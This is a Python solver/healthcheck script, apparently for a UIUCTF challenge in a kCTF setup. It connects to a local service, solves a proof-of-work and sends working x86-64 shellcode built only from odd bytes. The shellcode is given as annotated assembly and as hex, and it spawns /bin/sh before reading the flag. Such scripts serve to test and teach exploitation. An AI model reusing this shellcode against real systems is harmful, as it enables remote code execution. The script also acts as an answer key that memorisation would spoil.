#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

r.recvuntil(b':\n')

assembly = '''
.intel_syntax noprefix
.global _start

_start:
    // the is '/bin/sh\x00' shifted left by 2
    mov r15, 0x1A1CDBDB9A589BD
    // we need a mask because there are still a few even bytes
    mov r13, 0xFFFFFDFFFFFFFDFD
    shr r13, 1
    // get rid of even bytes
    and r13, r15
    // shift to get original /bin/sh string
    shr r13, 1
    shr r13, 1
    // now it's on the stack
    push r13

    // get rsp by using the fact that rbp is rsp + 0x28 at the start
    push rbp
    pop r13
    // subtract 0x30 = 0x28 + 0x8 (pushed /bin/sh string)
    sub r13, 0x2f
    sub r13, 0x01
    push r13
    pop rdi

    // zero registers
    xor r11d, r11d
    lea esi, [r11d]
    lea edx, [r11d]

    // need to get 0x3b to rax for execve syscall
    xor ebx, ebx
    mov bl, 0x3b
    mov r11d, ebx
    lea eax, [r11d]

    // this is alread odd :)
    syscall
'''

# can't assemble shellcode on the healthcheck server
# payload = asm(assembly, arch='amd64')
payload = bytes.fromhex('49bfbd89a5b9bdcda10149bdfdfdfffffffdffff49d1ed4d21fd49d1ed49d1ed415555415d4983ed2f4983ed0141555f4531db67418d3367418d1331dbb33b4189db67418d030f05')

r.sendline(payload)

r.clean(timeout=1)

r.sendline(b'cat /flag')

print(r.recvuntil(b'uiuctf{') + r.recvuntil(b'}'))

exit(0)
